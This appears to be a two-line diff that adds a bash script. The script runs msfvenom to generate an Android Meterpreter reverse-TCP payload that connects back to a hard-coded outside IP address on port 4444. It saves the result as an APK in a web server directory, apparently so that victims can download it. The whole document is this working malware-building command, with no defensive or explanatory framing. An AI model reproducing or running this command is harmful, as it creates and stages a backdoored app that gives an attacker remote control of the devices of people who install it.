@@ -1,0 +1,2 @@
+#!/bin/bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=109.72.52.8 LPORT=4444 R > /srv/http/msf.apk
